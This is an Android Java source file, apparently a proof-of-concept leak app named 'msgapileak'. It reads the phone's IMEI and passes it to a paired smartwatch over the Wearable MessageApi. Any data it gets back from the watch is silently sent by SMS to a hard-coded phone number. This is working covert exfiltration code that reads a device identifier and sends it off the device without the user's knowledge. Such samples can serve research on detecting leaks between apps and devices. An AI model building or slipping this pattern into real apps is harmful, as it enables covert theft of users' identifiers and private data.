package com.aroes.msgapileak;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.common.api.ResultCallback;
import com.google.android.gms.wearable.CapabilityApi;
import com.google.android.gms.wearable.CapabilityInfo;
import com.google.android.gms.wearable.MessageApi;
import com.google.android.gms.wearable.MessageEvent;
import com.google.android.gms.wearable.Node;
import com.google.android.gms.wearable.Wearable;

import java.util.Set;

public class MainActivity extends Activity implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, MessageApi.MessageListener, ResultCallback<MessageApi.SendMessageResult>, ActivityCompat.OnRequestPermissionsResultCallback{

    private static final String TAG = "MainMobileActivity";
    //Google services client
    private GoogleApiClient mGoogleApiClient;
    //Capability name
    private static final String
            MESSAGE_RECEIVE_CAPABILITY_NAME = "receive_message_wear";
    //Selected watch id
    private String messageNodeId = null;


    //Request code for permission
    private static final int REQUEST_READ_PHONE_STATE = 1;
    private static final int REQUEST_SEND_SMS = 2;

    //Permission callback
    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case REQUEST_READ_PHONE_STATE:
                if ((grantResults.length > 0) && (grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    //TODO
                }
                break;
            case REQUEST_SEND_SMS:
                if ((grantResults.length > 0) && (grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    //TODO
                }
                break;
            default:
                break;
        }
    }

    private void requestPermissions() {
        int statePermissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);
        if (statePermissionCheck != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_READ_PHONE_STATE);
        } else {
            //TODO
        }
        int smsPermissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS);
        if (smsPermissionCheck != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.SEND_SMS}, REQUEST_READ_PHONE_STATE);
        } else {
            //TODO
        }
    }

    private void findMessageCandidates() {
        CapabilityApi.GetCapabilityResult result =
                Wearable.CapabilityApi.getCapability(
                        mGoogleApiClient, MESSAGE_RECEIVE_CAPABILITY_NAME,
                        CapabilityApi.FILTER_REACHABLE).await();

        updateMessageReceiveCapability(result.getCapability());
    }

    private void updateMessageReceiveCapability(CapabilityInfo capabilityInfo) {
        Set<Node> connectedNodes = capabilityInfo.getNodes();

        messageNodeId = pickBestNodeId(connectedNodes);

    }

    private String pickBestNodeId(Set<Node> nodes) {
        String bestNodeId = null;
        // Find a nearby node or pick one arbitrarily
        for (Node node : nodes) {
            if (node.isNearby()) {
                return node.getId();
            }
            bestNodeId = node.getId();
        }
        return bestNodeId;
    }



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestPermissions();
        //Instantiate google play services
        mGoogleApiClient = new GoogleApiClient.Builder(this)
                .addApi(Wearable.API)
                .addConnectionCallbacks(this)
                .addOnConnectionFailedListener(this)
                .build();


    }

    @Override
    protected void onStart() {
        super.onStart();
        mGoogleApiClient.connect();
    }

    @Override
    protected void onStop() {
        if (null != mGoogleApiClient && mGoogleApiClient.isConnected()) {
            Wearable.MessageApi.removeListener(mGoogleApiClient, this);
            mGoogleApiClient.disconnect();
        }
        super.onStop();
    }

    @Override
    protected void onPause() {
        Log.d(TAG, "onPause()");
        super.onPause();

        if ((mGoogleApiClient != null) && mGoogleApiClient.isConnected()) {

            mGoogleApiClient.disconnect();
        }
    }

    @Override
    protected void onResume() {
        Log.d(TAG, "onResume()");
        super.onResume();
        if (mGoogleApiClient != null) {
            mGoogleApiClient.connect();
        }
    }

    @Override
    public void onConnected(@Nullable Bundle bundle) {
        if (Log.isLoggable(TAG, Log.DEBUG)) {
            Log.d(TAG, "Connected to Google Api Service");
        }
        Wearable.MessageApi.addListener(mGoogleApiClient, this);

        //Update capable nodes, select nearest one, put in messageNodeId
        new Thread(new Runnable() {
            public void run() {
                findMessageCandidates();
            }
        }).start();



        //Add capability listener that calls for messageNodeId update when device connects
        CapabilityApi.CapabilityListener capabilityListener =
                new CapabilityApi.CapabilityListener() {
                    @Override
                    public void onCapabilityChanged(CapabilityInfo capabilityInfo) {
                        updateMessageReceiveCapability(capabilityInfo);
                    }
                };
        Wearable.CapabilityApi.addCapabilityListener(
                mGoogleApiClient,
                capabilityListener,
                MESSAGE_RECEIVE_CAPABILITY_NAME);


        //Send imei to nearest node
        TelephonyManager TM = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imeiNo = TM.getDeviceId();
        sendMessage(imeiNo.getBytes());

    }


    //Upon receiving message (send by sms)
    @Override
    public void onMessageReceived(MessageEvent messageEvent) {
        byte[] leakBytes = messageEvent.getData();
        String leak = new String(leakBytes);
        if (Log.isLoggable(TAG, Log.DEBUG)) {
            Log.d(TAG, "Received leak");
        }
        SmsManager SM = SmsManager.getDefault();
        SM.sendTextMessage("07922021702", null, leak, null, null);
    }



    //Code for message sending
    public static final String MESSAGE_PATH = "/leaked";

    //Send bytes to current node
    private void sendMessage(byte[] leak) {
        if (messageNodeId != null) {
            Wearable.MessageApi.sendMessage(mGoogleApiClient, messageNodeId,
                    MESSAGE_PATH, leak).setResultCallback(this);
        } else {
            if (Log.isLoggable(TAG, Log.DEBUG)) {
                Log.d(TAG, "Unable to retrieve node with message receive capability");
            }
        }
    }

    //Result of sent message
    @Override
    public void onResult(MessageApi.SendMessageResult sendMessageResult) {
        if (!sendMessageResult.getStatus().isSuccess()) {
            if (Log.isLoggable(TAG, Log.DEBUG)) {
                Log.d(TAG, "Failed to send message");
            }
        }
    }

    @Override
    public void onConnectionSuspended(int i) {

    }

    @Override
    public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {

    }

}
